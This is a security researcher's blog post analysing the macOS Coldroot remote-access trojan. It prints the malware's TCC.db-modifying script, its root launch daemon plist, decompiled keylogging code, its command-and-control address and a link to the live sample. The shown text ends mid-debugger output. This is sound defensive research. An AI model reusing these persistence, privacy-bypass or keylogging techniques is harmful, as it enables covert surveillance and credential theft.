<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">

<head>
<title>Objective-See</title>

<link rel="shortcut icon" href="../images/logoApple.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link href="../css/ss-social.css" rel="stylesheet" />
<link href="../css/ss-standard.css" rel="stylesheet" />
<link href="../css/timeline.css" rel="stylesheet" />
<link href="../css/table.css" rel="stylesheet" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:title" content="Tearing Apart the Undetected (OSX)Coldroot RAT" />
<meta name="twitter:description" content="analyzing the persistence, features, and capabilities of a cross-platform backdoor" />
<meta name="twitter:image" content="https://objective-see.com/images/blog/blog_0x2A/screencapt.png" />

<meta property="og:title" content="Tearing Apart the Undetected (OSX)Coldroot RAT" />
<meta property="og:type" content="website" />
<meta property="og:image" content="https://objective-see.com/images/blog/blog_0x2A/screencapt.png" />


<script src="../js/analytics.js"></script>
<script src="../js/sweetalert.min.js"></script> 
<script src="../js/donationPopup.js"></script> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>

<script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
<script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<link href="https://objective-see.com/rss.xml" rel="alternate" type="application/rss+xml" title="Objective-See's Blog Feed" />

<meta http-equiv="Cache-Control" content="no-store" />

</head>

<body>
<nav role="main">
<ul>
	<li><a href="../index.html" class="menubutton logo">Objective See</a></li>
	<li><a href="../about.html" class="menubutton about">about</a></li>
	<li><a href="../blog.html" class="menubutton blog visited">blog</a></li>
	<li><a href="../malware.html" class="menubutton malware">malware</a></li>
	<li><a href="../products.html" class="menubutton products">products</a></li>
</ul>
</nav>

<div class="pageContent">
	<hr class="gradient">
	<br>
	<section class="blogContent">
		<div class="blogTitle">Tearing Apart the Undetected (OSX)Coldroot RAT</div>
		<div class="blogSubTitle">&rsaquo; analyzing the persistence, features, and capabilities of a cross-platform backdoor</div>
		<div class="blogDate">02/17/2018</div>
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
		<span class="n3rdFont">
		love these blog posts? support my tools &amp; writing on <a class="inlineLink" href="https://www.patreon.com/objective_see"><span class="n3rdFont">patreon</span></a> :)
		<br><br>
		<span>
		<a class="inlineLink" href="https://www.patreon.com/objective_see">
			<img src="../patreon/images/patreon.jpg" width="700" style="display:block; margin:auto;"/>
		</a>
		</span>
		<br>
		</span>
		</div>
		<br>
    <div style="border: 1px solid red; padding: 10px; margin-top:15px;">
    Want to play along? I've shared the malware, which can be downloaded <a class="inlineLink" href="https://objective-see.com/downloads/malware/Coldroot.zip">here</a> (password: <span class="n3rdFont">infect3d</span>).
    </div>
    <br>
		<br>
		<span style="color: #95c02d; font-weight: bold;">Background</span><br>
    Next month, I'm stoked to be presenting some new research at <a class="inlineLink" href="https://www.syscan360.org">SyScan360</a> in Singapore. Titled, <a class="inlineLink" href="https://www.syscan360.org/en/speakers/#issue-18pw">"<i>Synthetic Reality; Breaking macOS One Click at a Time</i>"</a> my talk will discuss a vulnerability I found in all recent versions of macOS that allowed unprivileged code to interact with any UI component including 'protected' security dialogs. Though reported and now patched, it allowed one to do things like dump passwords from the keychain or bypass High Sierra's "Secure Kext Loading"  - in a manner that was invisible to the user &#x1F648. 
    <br>
    <br>
    As part of my talk, I'm covering various older (and currently mitigated) attacks, which sought to dismiss or avoid UI security prompts. Think, (ab)using AppleScript, sending simulated mouse events via core graphics, or directly interacting with the file system. An example of the latter was DropBox, which <a class="inlineLink" href="http://applehelpwriter.com/2016/08/29/discovering-how-dropbox-hacks-your-mac/">directly modified</a> macOS's 'privacy database' (<span class="n3rdFont">TCC.db</span>) which contains the list of applications that are afforded 'accessibility' rights. With such rights, applications can then interact with system UIs, other applications, and even intercept key events (i.e. keylogging). By directly modifying the database, one could avoid the obnoxious system alert that is normally presented to the user:
    <br><br>
      <span><img src="../images/blog/blog_0x2A/slides.png" width="800" style="display:block; margin:auto;"/></span>
    <br>
    Though Apple now thwarts this attack, by protecting <span class="n3rdFont">TCC.db</span> via System Integrity Protection (SIP) - <a class="inlineLink" href="http://applehelpwriter.com/2015/11/16/how-keyloggers-get-around-os-x-security/">various macOS keyloggers</a> still attempt to utilize this 'attack.' I figured one of these keyloggers would be a good addition to my slides as an illustrative example.
    <br>
    <br>
    Hopping over to VirusTotal, I searched for files containing references to the <span class="n3rdFont">TCC.db</span> database, which returned a handful of hits:
    <br><br>
      <span><img src="../images/blog/blog_0x2A/virusTotal.png" width="800" style="display:block; margin:auto;"/></span>
    <br>
    Besides a variety of CounterStrike hacks (<span class="n3rdFont">csgohack.app</span>), and (known) keyloggers (<span class="n3rdFont">FreeKeylogger.dmg</span>, <span class="n3rdFont">KeyLogger.BlueBlood.A</span>), an unflagged file named <a class="inlineLink" href="https://www.virustotal.com/#/file/c20980d3971923a0795662420063528a43dd533d07565eb4639ee8c0ccb77fdf/detection"><span class="n3rdFont">com.apple.audio.driver2.app</span></a> (SHA-256: <span class="n3rdFont">c20980d3971923a0795662420063528a43dd533d07565eb4639ee8c0ccb77fdf</span>) caught my eye. It was recently submitted for a scan, in early January.
    <br><br>
      <span><img src="../images/blog/blog_0x2A/detections.png" width="800" style="display:block; margin:auto;"/></span>
    <br>
    Note: Al Varnell, (<a class="inlineLink" href="https://twitter.com/alvarnell">@alvarnell</a>), pointed out it's likely that the original file name was <span class="n3rdFont">com.apple.audio.driver.app</span>, which corresponds to internal strings within the binary. Thus we'll refer to this sample's application bundle as <span class="n3rdFont">com.apple.audio.driver.app</span> for the rest of this post.
    <br>
    <br>

    Though currently no AV-engine on VirusTotal flags this application as malicious, the fact it contained a reference to (<span class="n3rdFont">TCC.db</span>) warranted a closer look.

    <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
    <pre>
  __const:001D2804  text "UTF-16LE", 'touch /private/var/db/.AccessibilityAPIEnabled &amp;&amp; s'
  __const:001D2804  text "UTF-16LE", 'qlite3 "/Library/Application Support/com.apple.TCC/'
  __const:001D2804  text "UTF-16LE", '<b>TCC.db</b>" "INSERT or REPLACE INTO access (service, cl'
  __const:001D2804  text "UTF-16LE", 'ient, client_type, allowed, prompt_count) VALUES (',27h
  __const:001D2804  text "UTF-16LE", 'kTCCServiceAccessibility',27h,', ',27h,0</pre>
    </span>
    </div>  
    <br>
    Using Digita Security's <a class="inlineLink" href="https://digitasecurity.com/product/uxprotect/">UXProtect</a>, I was also able to easily confirm that Apple has not silently pushed out any XProtect signatures for the malware (to intrinsically protect macOS users):

     <br><br>
      <span><img src="../images/blog/blog_0x2A/uxprotect.png" width="800" style="display:block; margin:auto;"/></span>
    <br>

    <br>
    <br>
    <span style="color: #95c02d; font-weight: bold;">Determining Malice</span><br>
    My first question was, "<i>is <span class="n3rdFont">com.apple.audio.driver.app</span> malicious?</i>" 
    <br>
    <br>Though there is no exact science to arrive at a conclusive answer for this question, several (massive) 'red flags' stick out here. Flags, that clearly confirm the malicious nature of <span class="n3rdFont">com.apple.audio.driver.app</span>:
    <ul style="list-style-type:square">
    <li>
    As mentioned, the application contains a reference to <span class="n3rdFont">TCC.db</span>. AFAIK, there is no legitimate or benign reason why non-Apple code should ever reference this file!
    </li><br>
    <li>
    The application is unsigned, though claims to be an "Apple audio driver". My <a class="inlineLink" href="https://objective-see.com/products/whatsyoursign.html">WhatsYourSign</a> Finder extension, will display any signing information (or lack thereof) via the UI:
    <br><br>
      <span><img src="../images/blog/blog_0x2A/wys.png" style="display:block; margin:auto;"/></span>
    <br>
    </li><br>
    <li>
    The application is packed with UPX. Though packing a binary doesn't make it malicious per se, it's rare to see a legitimate binary packed on macOS:
    <br><br>
    <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
    <span class="n3rdFont"><pre>
  $ python isPacked.py com.apple.audio.driver.app
  scanning com.apple.audio.driver.app/Contents/MacOS/com.apple.audio.driver
  
  UPX segments found

  <b>binary is packed (packer: UPX)</b></pre>
  </span> 
  </div>
    </li><br>

    <li>
    For it's main icon, the application uses macOS's standard 'document' icon to masquerade as a document. This is common tactic used by malware authors in order to trick user's in running their malicious creations: 
    <br><br>
      <span><img src="../images/blog/blog_0x2A/appIcon.png" style="display:block; margin:auto;"/></span>
    <br>
    </li><br>

    <li>
    When executed, the application displays a standard authentication prompt, requesting user credentials. After the user enters their creds, then application performs no other readily visible action. This is not normal application behavior:
    <br><br>
      <span><img src="../images/blog/blog_0x2A/auth.png" style="display:block; margin:auto;"/></span>
    <br>
    </li><br>

    <li>
    Behind the scenes the application persists itself as a launch daemon. This is a common method employed by malware to ensure that it is automatically (re)started every time an infected system is rebooted. <a class="inlineLink" href="https://objective-see.com/products/blockblock.html">BlockBlock</a> will detect this persistence:
    <br><br>
      <span><img src="../images/blog/blog_0x2A/bb.png" style="display:block; margin:auto;"/></span>
    <br>
    </li><br>

    <li>
    Again, behind the scenes, the application will automatically beacon out to a server. While creating a network connection is itself not inherently malicious, it is a common tactic used by malware - specifically to check in with a command &amp; control server for tasking. <a class="inlineLink" href="https://objective-see.com/products/lulu.html">LuLu</a> will intercept and alert on this connection attempt:
    <br><br>
      <span><img src="../images/blog/blog_0x2A/lulu.png" style="display:block; margin:auto;"/></span>
    <br>
    </li><br>
    </ul>   
    At this point I was thoroughly convinced that though no AV-engine on VirusTotal flagged <span class="n3rdFont">com.apple.audio.driver.app</span>, it was clearly malicious! 
    <br>
    <br>
    Let's now dive in and reverse it to gain a deeper understanding of its actions and capabilities. 

    <br>
    <br>
    <span style="color: #95c02d; font-weight: bold;">Analysis</span><br>

    First, let's unpack the malware. Since it's packed with UPX, one can trivially unpack it via <span class="n3rdFont">upx -d</span>:

    <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
    <span class="n3rdFont">
  <pre>$ upx -d Contents/MacOS/com.apple.audio.driver 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
  UPX 3.09        Markus Oberhumer, Laszlo Molnar & John Reiser   Feb 18th 2013

  With LZMA support, Compiled by Mounir IDRASSI (mounir@idrix.fr)

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   3292828 <-    983040   29.85%    Mach/i386    com.apple.audio.driver

  Unpacked 1 file.</pre>
    </span>
  </div>
  <br>
  Once the malware has been unpacked, one of the first things we notice when reversing its binary, is that it was apparently written in pascal. Though likely done to achieve cross-platform comparability, who the hell writes pascal on macOS!?! Well apparently at least one person!
    <br><br>
    How do we know it was likely written in pascal? First, looking at the malware's entry point, <span class="n3rdFont">main()</span>, we see it calling something named <span class="n3rdFont">FPC_SYSTEMMAIN</span> which in turn invokes a function named <span class="n3rdFont">PASCALMAIN</span>:

    <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont"><pre>
  int _main(int arg0, int arg1, int arg2) {
    eax = _FPC_SYSTEMMAIN(arg2, arg1, arg2);
    return eax;
  }

  int <b>_FPC_SYSTEMMAIN</b>(int arg0, int arg1, int arg2) {
    *_U_$SYSTEM_$$_ARGC = arg0;
    
    _SYSTEM_$$_SET8087CW$WORD();
    
    eax = <b>_PASCALMAIN</b>();
    return eax;
  }</pre>
    </div>  
    <br>
    Note that here, <span class="n3rdFont">FPC</span> stands for <a class="inlineLink" href="https://en.wikipedia.org/wiki/Free_Pascal">'Free Pascal Compiler'</a>
    <br>
    <br>
    Other strings in the binary reference the Free Pascal Compiler (FPC) and reveal the presence of several pascal libraries compiled into the malware:

    <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
    <span class="n3rdFont"><pre>
  $ strings -a Contents/MacOS/com.apple.audio.driver | grep FPC
  
  FPC 3.1.1 [2016/04/09] for i386 - Darwin
  FPC_RESLOCATION
    
  TLazWriterTiff - Typhon LCL: 5.7 - FPC: 3.1.1
  TTiffImage - Typhon LCL: 5.7 - FPC: 3.1.1</pre>
  </span> 
  </div>
  <br>
  The malware's malicious logic begins in the aforementioned <span class="n3rdFont">PASCALMAIN</span> function. Due to the presence of debug strings and verbose method names, reversing is actually quite easy!
  <br>
  <br>
  First, the malware loads it 'settings'. It does by first building a path to its settings file, then invoking the <span class="n3rdFont">LOADSETTINGS</span> function. If the loading succeeds it logs a <span class="n3rdFont">"LoadSettings ok"</span> message:
  
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
    <pre>
  __text:00011DD4    call    _CUSTAPP$_$TCUSTOMAPPLICATION_$__$$_GETEXENAME$$ANSISTRING
  __text:00011DD9    mov     eax, [ebp+var_30]
  __text:00011DDC    lea     edx, [ebp+var_2C]
  __text:00011DDF    call    _SYSUTILS_$$_EXTRACTFILEPATH$RAWBYTESTRING$$RAWBYTESTRING
  __text:00011DE4    mov     eax, [ebp+var_2C]
  __text:00011DE7    call    _GLOBALVARS_$$_<b>LOADSETTINGS</b>$ANSISTRING$$BOOLEAN
  __text:00011DEC    test    al, al
  __text:00011DEE    jz      short loc_11DFB
  __text:00011DF0    lea     eax, (aLoadsettingsOk - 11D95h)[ebx] ; "LoadSettings ok "
  __text:00011DF6    call    _DEBUGUNIT_$$_WRITELOG$UNICODESTRING</pre>
    </span>
    </div>
    <br>
    Where is the malware's setting file? Well if we look at the disassembly we can see it appending <span class="n3rdFont">"conx.wol"</span> to file path of the malware's binary (e.g <span class="n3rdFont">com.apple.audio.driver.app/Contents/MacOS/</span>) - and the checking if that file exists:
    <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
    <pre>
  __text:000683F3    lea     ecx, (aConxWol - 683A2h)[ebx] ; <b>"conx.wol"</b>
  __text:000683F9    call    fpc_ansistr_concat
  __text:000683FE    mov     eax, [ebp+var_14]
  __text:00068401    call    _SYSUTILS_$$_FILEEXISTS$RAWBYTESTRING$$BOOLEAN</pre>
    </span>
    </div>
    <br>
    A file monitor (such as macOS's built in <span class="n3rdFont">fs_usage</span> utility) dynamically reveals the path to this file, as the malware opens and reads it during execution:

    <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
    <span class="n3rdFont"><pre>
  # fs_usage -w -f filesystem 
  access   (___F)   com.apple.audio.driver.app/Contents/MacOS/conx.wol
  open     F=3      (R_____)  com.apple.audio.driver.app/Contents/MacOS/<b>conx.wol</b>
  flock    F=3      <LOCK_SH | LOCK_NB>
  read     F=3      B=0x92
  close    F=3</pre>
  </span> 
  </div>
  <br>
  Opening the settings file, <span class="n3rdFont">"conx.wol"</span>, reveals the malware's configuration (in plaintext JSON):
  <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
    <span class="n3rdFont"><pre>
  $ cat com.apple.audio.driver.app/Contents/MacOS/conx.wol
  {
    "PO": 80,
    "HO": "45.77.49.118",
    "MU": "CRHHrHQuw JOlybkgerD",
    "VN": "Mac_Vic",
    "LN": "adobe_logs.log",
    "KL": true,
    "RN": true,
    "PN": "com.apple.audio.driver"
  }</pre>
  </span> 
  </div>
  <br>
  The meaning of the settings can be ascertained by their abbreviation and/or value. For example, <span class="n3rdFont">'PO'</span> is port (HTTP, 80), <span class="n3rdFont">'HO'</span> is host (attacker's command &amp; control server at <span class="n3rdFont">45.77.49.118</span>). <span class="n3rdFont">'MU'</span> is likely 'mutex', while <span class="n3rdFont">'VN'</span> is the name of the victim. The <span class="n3rdFont">'LN'</span> value is the name of the log file for the keylogger (<span class="n3rdFont">'KL'</span>). I'm guessing <span class="n3rdFont">'RN'</span> is for run normal - meaning the implant can run as a default user (vs. root). Finally <span class="n3rdFont">'PN'</span> is the process name of the malware. 
  <br>
  <br>
  Once the malware has loaded its setting from <span class="n3rdFont">conx.wol</span>, it persistently installs itself. The logic for the install is contained in the <span class="n3rdFont">'_INSTALLMEIN_$$_INSTALL'</span> function:
  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
    <pre>
__text:00011E12    lea     eax, (aInstallInit - 11D95h)[ebx] ; "Install init "
__text:00011E18    call    _DEBUGUNIT_$$_WRITELOG$UNICODESTRING
__text:00011E1D    call    <b>_INSTALLMEIN_$$_INSTALL$$BOOLEAN</b></pre>
    </span>
    </div>
    <br>
    The <span class="n3rdFont">'_INSTALLMEIN_$$_INSTALL'</span> performs the following steps: 
    <ol style="list-style-type:square">
    <li>copies itself to <span class="n3rdFont">/private/var/tmp/</span> </li><br>
    <li>builds a launch daemon plist in memory</li><br>
    <li>writes it out to <span class="n3rdFont">com.apple.audio.driver.app/Contents/MacOS/com.apple.audio.driver.plist</span> </li><br>
    <li>executes <span class="n3rdFont">/bin/cp</span> to install it into the <span class="n3rdFont">/Library/LaunchDaemons/</span> directory</li><br>
    <li>launches the newly installed launch daemon via <span class="n3rdFont">/bin/launchctl</span> </li><br>
    </ol>
    The 'template' for the launch daemon plist is embedded directly in the malware's binary:

    <br><br>
      <span><img src="../images/blog/blog_0x2A/plist.png" style="display:block; margin:auto;"/></span>
    <br>

    Once saved to disk we can easily dump the plist's contents: 

    <div style="padding: 10px; background-color:black; color:lime; font-size: 14px;">
    <span class="n3rdFont"><pre>$ cat /Library/LaunchDaemons/com.apple.audio.driver.plist 
  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
  &lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; ... &gt;
  &lt;plist version=&quot;1.0&quot;&gt;
  &lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.apple.audio.driver&lt;/string&gt;
    &lt;key&gt;Program&lt;/key&gt;
    &lt;string&gt;/private/var/tmp/com.apple.audio.driver.app
                  /Contents/MacOS/com.apple.audio.driver&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/private/var/tmp/com.apple.audio.driver.app
                /Contents/MacOS/com.apple.audio.driver&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;KeepAlive&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;UserName&lt;/key&gt;
    &lt;string&gt;root&lt;/string&gt;
  &lt;/dict&gt;</pre>
  </span>
  </div>
  <br>
  As the <span class="n3rdFont">RunAtLoad</span> key is set to <span class="n3rdFont">true</span>, the OS will automatically start the malware anytime the infected system is rebooted.
  <br>
  <br>

    We can dynamically watch the install unfold by simply running the malware, whilst <a class="inlineLink" href="https://github.com/objective-see/ProcInfo">ProcInfo</a> (my open-source process monitor), is running:

    <div style="padding: 10px; background-color:black; color:lime; font-size: 14px;">
    <span class="n3rdFont"><pre>
  # ./procInfo

  <span style="color:white">//copy self to /private/var/tmp/</span>
  process start:
  pid: 1222
  path: /bin/cp
  user: 501
  args: (
    "/bin/cp",
    "-r",
    "~/Desktop/com.apple.audio.driver.app/Contents/MacOS/../..",
    "/private/var/tmp/com.apple.audio.driver.app"
  )

  <span style="color:white">//copy launch daemon plist to /Library/LaunchDaemons</span>
  process start:
  pid: 1230
  path: /bin/cp
  user: 0
  args: (
    "/bin/cp",
    "~/Desktop/com.apple.audio.driver.app/Contents/MacOS/com.apple.audio.driver.plist",
    "/Library/LaunchDaemons"
  )

  <span style="color:white">//launch daemon instance</span>
  process start:
  pid: 1231
  path: /bin/launchctl
  user: 0
  args: (
    "/bin/launchctl",
    load,
    "/Library/LaunchDaemons/com.apple.audio.driver.plist"
  )</pre>
  </span> 
  </div>
  <br>
  As previously noted, this persistent install attempt will trigger a <a class="inlineLink" href="https://objective-see.com/products/blockblock.html">BlockBlock</a> alert:
  <br><br>
    <span><img src="../images/blog/blog_0x2A/bb.png" style="display:block; margin:auto;"/></span>
  <br>

  The astute reader will have noted that the install (copy) operation and launching of the daemon is executed as root (<span class="n3rdFont">user: 0</span>). The malware accomplishes this by executing these operation via it's <span class="n3rdFont">_LETMEIN_$$_EXEUTEWITHPRIVILEGES$$BOOLEAN</span> function.
  <br>
  <br>
  Reversing this function reveals it simply invokes Apple's <span class="n3rdFont">AuthorizationExecuteWithPrivileges</span> function. 'Under the hood' the OS invokes <span class="n3rdFont">/usr/libexec/security_authtrampoline</span> in order to execute the specified process as root (<span class="n3rdFont">security_authtrampoline</span> is setuid):
  <div style="padding: 10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont"><pre>
  # ./procInfo

  process start:
  pid: 1232
  path: /usr/libexec/security_authtrampoline
  user: 501
  args: (
    "/usr/libexec/security_authtrampoline",
    "/bin/launchctl",
    "auth 3",
    start,
    "/Library/LaunchDaemons/com.apple.audio.driver.plist"
  )</pre>
  </span> 
  </div>
  <br>
  Of course in order for <span class="n3rdFont">AuthorizationExecuteWithPrivileges</span> to succeed, user credentials are required and must be entered via an OS authentication prompt. The malware hopes the naive user will simply enter such credentials:
  <br><br>
      <span><img src="../images/blog/blog_0x2A/auth.png" style="display:block; margin:auto;"/></span>
  <br>
  Besides persistently installing itself as a launch daemon, the <span class="n3rdFont">'_INSTALLMEIN_$$_INSTALL'</span> function also attempts to provide the malware with accessibility rights (so that it may perform system-wide keylogging). In order to gain such rights the malware first creates the <span class="n3rdFont">/private/var/db/.AccessibilityAPIEnabled</span> file and then modifies the privacy database <span class="n3rdFont">TCC.db</span>, The former affords accessibility rights on older versions of macOS.
  <br>
  <br>
  The logic to enable accessibility rights, can be found in a bash script that the malware creates in <span class="n3rdFont">/private/var/tmp/runme.sh</span>:
  <div style="padding: 10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont"><pre>
  $ cat /private/var/tmp/runme.sh

  #!/bin/sh
  touch /private/var/db/.AccessibilityAPIEnabled &amp;&amp; 
  sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" "INSERT or 
    REPLACE INTO access (service, client, client_type, allowed, prompt_count) 
    VALUES ('kTCCServiceAccessibility', 'com.apple.audio.driver', 0, 1, 0);"</pre>
  </span> 
  </div>
  <br>
  Though this script is executed as root, on newer versions of macOS (Sierra+) it will fail as the privacy database is now protected by SIP:

  <div style="padding: 10px; background-color:black; color:lime; font-size: 14px;">
  <span class="n3rdFont"><pre>
  $ sw_vers 
  ProductName:  Mac OS X
  ProductVersion: 10.13.3

  $ ls -lartO@  /Library/Application\ Support/com.apple.TCC/TCC.db 
  -rw-r--r--  1 root  wheel  <b>restricted</b> /Library/Application Support/com.apple.TCC/TCC.db</pre>
  </span> 
  </div>
  <br>

  However, on older versions of OSX/macOS the malware will gain accessibility rights:

  <br><br>
    <span><img src="../images/blog/blog_0x2A/access.png" style="display:block; margin:auto;"/></span>
  <br>

  At this point, the malware is now fully persistently installed and will be started as root, each time the infected system is (re)started:

  <br><br>
    <span><img src="../images/blog/blog_0x2A/kk.png" width="800" style="display:block; margin:auto;"/></span>
  <br>

  Let's now look at the malware's features and capabilities. 
  <br>
  <br>
  Each time the malware is up and running it performs two main tasks:

  <ol>
    <li>kicks off keylogging logic</li><br>
    <li>checks in with the command &amp; control server and performs any received tasking</li><br>
  </ol>  

  The keylogging logic (referred to as 'keyloser'), is started when the malware executes <span class="n3rdFont">_KEYLOSER$_$TKEYLOGGERTHREAD_$__$$_CREATE$$TKEYLOGGERTHREAD</span> from <span class="n3rdFont">PASCALMAIN</span>. The keylogger thread 
  eventually invokes a function at <span class="n3rdFont">0x0006a950</span> which starts the actual keylogging logic. Looking at its decompilation, it's easy to see that the malware is using Apple's <span class="n3rdFont">CoreGraphics</span> APIs to capture key presses:

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
    <pre>
 int sub_6a950(int arg0, int arg1, int arg2, int arg3, int arg4) {

  eax = <b>CGEventTapCreate</b>(0x1, 0x0, 0x0, 0x1c00, 0x0, sub_6a3d0);
  if (eax != 0x0) {
   <b>CFRunLoopAddSource</b>(CFRunLoopGetCurrent(), 
   CFMachPortCreateRunLoopSource(**_kCFAllocatorDefault, var_4, 0x0), **_kCFRunLoopCommonModes);

    <b>CGEventTapEnable</b>(0x1, 0x1);
    <b>CFRunLoopRun</b>();
  }

  ...

  return eax;
 }</pre>
 </span>
 </div>  
 <br>
 And speaking of keylogging via <span class="n3rdFont">CoreGraphics</span> APIs, I'm actually also talking about this in my <a class="inlineLink" href="https://www.syscan360.org">SyScan360</a> talk:
 <br><br>
    <span><img src="../images/blog/blog_0x2A/keylogging.png" width="800" style="display:block; margin:auto;"/></span>
 <br>
 As we can see in the malware's code and my slide, to capture keystrokes: simply create an 'event tap', enable it, and add it to the current runloop (note that root/accessibility is requires to capture all key presses). Now, any time the user generates a key event, the OS will automatically call the callback function that was specified in the call to <span class="n3rdFont">CGEventTapCreate</span>. For the malware, this is <span class="n3rdFont">sub_6a3d0</span>.
 <br>
 <br>
 The code in the <span class="n3rdFont">sub_6a3d0</span> function simply formats and logs the key press to file specified in the <span class="n3rdFont">"LN"</span> value of settings file: <span class="n3rdFont">adobe_logs.log</span>. 
 <br>
 <br>
 By 'tailing' the keylogger's log file, we can observe it in action...for example, logging my banking credentials:
  <br><br>
    <span><img src="../images/blog/blog_0x2A/keylogger.gif" style="display:block; margin:auto;"/></span>
  <br> 

  Once the keylogging thread is off and running, kicks off the main client thread via a call to <span class="n3rdFont">CONNECTIONTHREAD$_$TMAINCLIENTTHREAD_$__$$_CREATE$BOOLEAN$$TMAINCLIENTTHREAD</span>. This first opens a connect to the malware's command &amp; control server whose IP address and port are specified in the malware's settings file, <span class="n3rdFont">conx.wol</span>:

  <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
    <span class="n3rdFont"><pre>
  $ cat com.apple.audio.driver.app/Contents/MacOS/conx.wol
  {
    "PO": 80,
    "HO": "45.77.49.118",
    ...
  }</pre>
  </span> 
  </div>
  <br>
  Once a connection has been made, the <span class="n3rdFont">OSX/Coldroot</span> gathers some information about the infected host and sends it to the server. The survey logic is implemented in a function at address <span class="n3rdFont">0x000636c0</span>, which calls various functions such as <span class="n3rdFont">'GETHWIDSERIAL'</span>, <span class="n3rdFont">'GETUSERNAME'</span>, and <span class="n3rdFont">'GETRAMSIZEALL'</span>:

  <div style="border: 1px solid gray; padding: 10px; margin-top:15px;">
    <span class="n3rdFont">
    <pre>
  int sub_636c0() {
    ...

    _OSFUNCTIONS_$$_GETHWIDSERIAL$$ANSISTRING();
    
    _OSFUNCTIONS_$$_GETUSERNAME$$ANSISTRING();
    
    _OSFUNCTIONS_$$_GETOS$$ANSISTRING();
    
    _OSFUNCTIONS_$$_GETRAMSIZEALL$$INT64();
    
  }</pre>
  </span>
  </div> 
  <br>
  These functions invoke various macOS utilities such as <span class="n3rdFont">sw_vers</span>, <span class="n3rdFont">uname</span>, and <span class="n3rdFont">id</span> to gather the required information:  
  <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  # ./procInfo

  <span style="color:white">//get OS version</span>
  process start:
  pid: 1569
  path: /usr/bin/<b>sw_vers</b>
  user: 501
  args: (
    "/usr/bin/sw_vers"
  )

  <span style="color:white">//get architecture</span>
  process start:
  pid: 1566
  path: /usr/bin/<b>uname</b>
  user: 501
  args: (
    "/usr/bin/uname",
    "-m"
  )

  <span style="color:white">//get user name</span>
  process start:
  pid: 1567
  path: /usr/bin/<b>id</b>
  user: 501
  args: (
    "/usr/bin/id",
    "-F"
  )</pre>
  </span>
  </div>
  <br>

  In a debugger (<span class="n3rdFont">lldb</span>), we can set a breakpoint on <span class="n3rdFont">send</span> and then dump the bytes being sent to the command &amp; control server:

  <div style="padding: 10px; background-color:black; color:lime; font-size: 15px;">
  <span class="n3rdFont"><pre>
  lldb com.apple.audio.driver.app
  (lldb) target create "com.apple.audio.driver.app"
  Current executable set to 'com.apple.audio.driver.app' (i386).
  (lldb) b send

  (lldb) r
  
  Process 1294 stopped
  * thread #5, stop reason = breakpoint 1.1
    frame #0: 0xa766a39f libsystem_c.dylib`send

  (lldb) x/3x $esp
  0xb0596a9c: 0x00173a6d 0x00000003 <b>0x03b2d1a8</b>

  (lldb) x/100bx 0x03b2d1a8
  0x03b2d1a8: 0x70 0x75 0x3f 0x00 0x48 0x6f 0x59 0xb0
  0x03b2d1b0: 0x8e 0x8a 0x02 0x00 0x8c 0x75 0x3f 0x00
  0x03b2d1b8: 0xae 0x00 0x00 0x00 0x00 0x00 0x00 0x00
  0x03b2d1c0: 0xad 0xde 0x02 0x00 0x00 0x00 0x00 0x00
  0x03b2d1c8: 0x00 0x00 0x00 0x00 0x7b 0x22 0x56 0x65
  0x03b2d1d0: 0x72 0x22 0x3a 0x31 0x2c 0x22 0x52 0x41
  0x03b2d1d8: 0x4d 0x22 0x3a 0x30 0x2c 0x22 0x43 0x41
  0x03b2d1e0: 0x4d 0x22 0x3a 0x66 0x61 0x6c 0x73 0x65
  0x03b2d1e8: 0x2c 0x22 0x53 0x65 0x72 0x69 0x61 0x6c
  0x03b2d1f0: 0x22 0x3a 0x22 0x78 0x38 0x36 0x5f 0x36
  0x03b2d1f8: 0x34 0x5c 0x6e 0x22 0x2c 0x22 0x50 0x43
  0x03b2d200: 0x4e 0x61 0x6d 0x65 0x22 0x3a 0x22 0x75
  0x03b2d208: 0x73 0x65 0x72 0x5c
  
  (lldb) x/s 0x03b2d1cc
